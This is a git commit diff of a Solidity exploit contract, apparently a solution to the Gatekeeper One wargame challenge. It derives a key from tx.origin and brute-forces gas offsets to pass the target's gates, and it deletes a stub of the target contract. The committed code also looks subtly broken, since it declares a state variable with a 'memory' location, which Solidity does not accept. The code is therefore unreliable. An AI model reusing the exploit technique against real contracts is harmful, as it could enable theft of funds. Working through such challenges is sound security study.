99e07005bac13dff94ff3ade38010f4254d23c8a
yarode <jaspervdvorst@gmail.com>
2022-01-01 21:26:55 +0800

    gatekeeper one fixed

--- GateSkipper.sol
+++ GateSkipper.sol
@@ -3,30 +3,17 @@ pragma solidity ^0.6.0;
 
 contract GateSkipper {
 
-    GatekeeperOne public target = GatekeeperOne(0x351a6E432063B56e5695f8BE18A7c8936a029787);
-    bytes8 origin = 0x512e6926B1e19C2c;
-    bytes8 key = origin & 0xFFFFFFFF0000FFFF;
+    address target = 0x351a6E432063B56e5695f8BE18A7c8936a029787;
+    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
+
+    bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),
+      key
+    );
 
     function entrance() public returns (bytes memory) {
         for(uint256 i = 0; i < 120; i++) {
-            (bool result, bytes memory data) = address(target).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
-            if(result) return data;
+            (bool result, ) = address(target).call{gas: i + 150 + 8191*3}(encodedParams);
+            if(result) break;
         }
     }
-}
-
-contract GatekeeperOne {
-
-    modifier gateOne() {
-        _;
-    }
-    modifier gateTwo() {
-        _;
-     }
-    modifier gateThree(bytes8 _gateKey) {
-        _;
-     }
-
-    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { }
-
 }
